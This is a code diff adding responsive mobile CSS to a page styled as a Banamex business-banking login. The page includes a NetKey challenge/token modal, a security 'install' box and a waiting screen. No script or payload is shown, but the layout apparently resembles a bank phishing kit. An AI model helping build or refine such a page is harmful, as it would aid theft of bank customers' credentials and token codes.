@@ -917,6 +917,373 @@
         }
 
         .db-muted-small{ color:#6b7b80; font-size:12px; }
+
+        /* ========== RESPONSIVE MOBILE STYLES ========== */
+        
+        /* Tablets y pantallas medianas */
+        @media (max-width: 1024px) {
+            .content-wrapper {
+                flex-direction: column;
+                align-items: center;
+                padding: 40px 30px;
+            }
+
+            .login-box,
+            .security-box {
+                width: 100%;
+                max-width: 450px;
+            }
+
+            .db-main {
+                grid-template-columns: 1fr;
+            }
+
+            .db-cards-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+
+            .db-summary {
+                grid-column: 1 / -1;
+            }
+        }
+
+        /* Móviles */
+        @media (max-width: 768px) {
+            /* Header móvil */
+            .header {
+                padding: 12px 0;
+            }
+
+            .header-inner {
+                flex-direction: row;
+                padding: 0 15px;
+                gap: 10px;
+            }
+
+            .logo-section {
+                gap: 8px;
+                flex: 1;
+            }
+
+            .logo-banamex {
+                height: 24px;
+            }
+
+            .separator-dot {
+                font-size: 6px;
+            }
+
+            .logo-bne {
+                height: 20px;
+            }
+
+            .header-links {
+                gap: 12px;
+                font-size: 12px;
+            }
+
+            /* Main content móvil */
+            .main-container {
+                min-height: auto;
+                height: auto;
+                padding-bottom: 40px;
+            }
+
+            .content-wrapper {
+                padding: 25px 15px;
+                gap: 15px;
+            }
+
+            .login-box,
+            .security-box {
+                width: 100%;
+                max-width: 100%;
+                padding: 25px 20px;
+            }
+
+            .login-box h2 {
+                font-size: 22px;
+                margin-bottom: 20px;
+            }
+
+            .form-group {
+                margin-bottom: 18px;
+            }
+
+            .btn-login,
+            .btn-install {
+                padding: 12px;
+                font-size: 14px;
+            }
+
+            .security-title {
+                gap: 10px;
+            }
+
+            .shield-icon {
+                width: 40px;
+                height: 40px;
+            }
+
+            .security-text {
+                font-size: 14px;
+            }
+
+            /* Carousel dots móvil */
+            .carousel-dots {
+                bottom: 15px;
+            }
+
+            .dot {
+                width: 8px;
+                height: 8px;
+            }
+
+            /* Footer móvil */
+            .footer-columns {
+                grid-template-columns: 1fr;
+                gap: 25px;
+            }
+
+            .footer-bottom {
+                flex-direction: column;
+                gap: 15px;
+                text-align: center;
+            }
+
+            /* Dashboard móvil */
+            .db-page {
+                padding: 15px;
+            }
+
+            .db-topbar {
+                flex-direction: column;
+                align-items: flex-start;
+                padding: 12px 15px;
+                gap: 12px;
+            }
+
+            .db-topnav {
+                width: 100%;
+                flex-wrap: wrap;
+                gap: 10px;
+                font-size: 13px;
+            }
+
+            .db-user-area {
+                width: 100%;
+                justify-content: space-between;
+            }
+
+            .db-main {
+                margin-top: 15px;
+                grid-template-columns: 1fr;
+                gap: 15px;
+            }
+
+            .db-cards-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .db-card {
+                padding: 15px;
+                min-height: auto;
+            }
+
+            .db-summary {
+                flex-direction: column;
+                text-align: center;
+                padding: 18px;
+            }
+
+            .db-summary .db-right {
+                width: 100%;
+            }
+
+            .db-cards-row {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+
+            .db-right-column {
+                gap: 12px;
+            }
+
+            /* Modales móvil */
+            .modal-overlay {
+                padding: 10px;
+            }
+
+            .modal-container {
+                padding: 20px 15px;
+                max-width: 100%;
+            }
+
+            .netkey-header {
+                flex-direction: column;
+                gap: 12px;
+            }
+
+            .brand-mark {
+                height: 35px;
+            }
+
+            .datetime {
+                font-size: 13px;
+            }
+
+            .netkey-card {
+                flex-direction: column;
+                gap: 15px;
+            }
+
+            .col-left,
+            .col-right {
+                width: 100%;
+                border-left: none;
+                padding: 0;
+            }
+
+            .col-right {
+                border-top: 1px solid var(--card-border);
+                padding-top: 15px;
+            }
+
+            .challenge-display {
+                font-size: 28px;
+                padding: 15px;
+            }
+
+            .netkey-input {
+                font-size: 24px;
+                padding: 12px;
+            }
+
+            .netkey-buttons {
+                flex-direction: column;
+                gap: 10px;
+            }
+
+            .netkey-btn {
+                width: 100%;
+            }
+
+            /* Contact modal móvil */
+            .contact-modal-container {
+                width: 95%;
+                max-width: 95%;
+            }
+
+            .contact-card {
+                padding: 25px 20px;
+            }
+
+            .contact-title {
+                font-size: 18px;
+            }
+
+            .contact-message {
+                padding: 15px;
+                font-size: 13px;
+            }
+
+            .form-label {
+                font-size: 13px;
+            }
+
+            .form-input {
+                padding: 10px 12px;
+                font-size: 16px; /* Previene zoom en iOS */
+            }
+
+            .contact-btn-submit {
+                padding: 12px 20px;
+                font-size: 15px;
+            }
+
+            /* Waiting modal móvil */
+            .waiting-container {
+                padding: 35px 25px;
+                width: 95%;
+            }
+
+            .waiting-logos {
+                gap: 8px;
+            }
+
+            .waiting-logos img {
+                max-width: 100px;
+            }
+
+            .waiting-loader img {
+                width: 80px;
+                height: 80px;
+            }
+
+            .waiting-title {
+                font-size: 18px;
+            }
+        }
+
+        /* Móviles pequeños */
+        @media (max-width: 480px) {
+            .header-inner {
+                padding: 0 10px;
+            }
+
+            .logo-banamex {
+                height: 20px;
+            }
+
+            .logo-bne {
+                height: 16px;
+            }
+
+            .header-links {
+                font-size: 11px;
+                gap: 8px;
+            }
+
+            .login-box,
+            .security-box {
+                padding: 20px 15px;
+            }
+
+            .login-box h2 {
+                font-size: 20px;
+            }
+
+            .db-brand h1 {
+                font-size: 16px;
+            }
+
+            .db-brand p {
+                font-size: 11px;
+            }
+
+            .db-card h3 {
+                font-size: 16px;
+            }
+
+            .db-card p {
+                font-size: 12px;
+            }
+
+            .waiting-title {
+                font-size: 16px;
+            }
+
+            .challenge-display {
+                font-size: 24px;
+                padding: 12px;
+            }
+
+            .netkey-input {
+                font-size: 20px;
+                padding: 10px;
+            }
+        }
     </style>
 </head>
 <body>
